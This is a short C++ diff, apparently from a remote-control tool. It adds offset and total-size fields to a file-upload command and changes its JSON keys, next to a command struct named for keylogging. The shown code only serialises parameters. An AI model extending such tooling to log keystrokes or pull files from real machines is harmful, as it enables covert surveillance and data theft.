@@ -40,11 +40,15 @@ struct CommandKeylogger
 struct CommandUploadFile
 {
     std::string path;
+    std::int64_t offset = 0;
+    std::int64_t totalBytes = 0;
 
     rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
     {
         rapidjson::Value value(rapidjson::kObjectType);
-        value.AddMember("path", rapidjson::Value(path.c_str(), allocator), allocator);
+        value.AddMember("Path", rapidjson::Value(path.c_str(), allocator), allocator);
+        value.AddMember("Offset", offset, allocator);
+        value.AddMember("TotalBytes", totalBytes, allocator);
         return value;
     }
 };
